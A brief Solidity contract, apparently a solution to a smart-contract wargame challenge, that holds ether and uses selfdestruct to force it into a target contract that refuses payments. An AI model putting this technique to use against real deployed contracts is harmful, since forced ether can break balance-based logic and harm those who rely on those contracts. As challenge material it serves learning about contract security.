// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {

    constructor() public payable {}

    receive() external payable {}

    function attack(address payable _forceAddress) public {
        selfdestruct(_forceAddress);
    }
}